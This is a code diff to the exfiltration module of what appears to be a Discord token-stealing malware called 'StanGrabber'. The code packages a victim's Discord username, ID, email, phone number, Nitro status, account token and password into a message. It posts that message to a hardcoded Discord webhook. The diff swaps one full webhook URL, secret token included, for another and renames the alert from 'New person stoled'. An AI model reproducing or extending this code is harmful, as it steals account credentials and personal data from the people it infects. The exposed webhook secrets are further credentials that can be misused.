@@ -42,13 +42,13 @@ exports.send = (req, res, webhook) => {
   author: {
     name: "Dev By Hideaki#1337 x Stan#1337"
   },
-  title: "New person stoled",
+  title: "Planu a mers lool 🤣",
   description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nPassword: \`${password}\``,
 
 }
             
-
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
+        const webhook = "https://discord.com/api/webhooks/989118285855485975/5U-lGtRe0wjIiunbiQKgJF-807mk8HvXHAfEj3hPA_MzUDtwuD7_sKzSEmuG1zHw6e-d";
+        axios.post(webhook, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
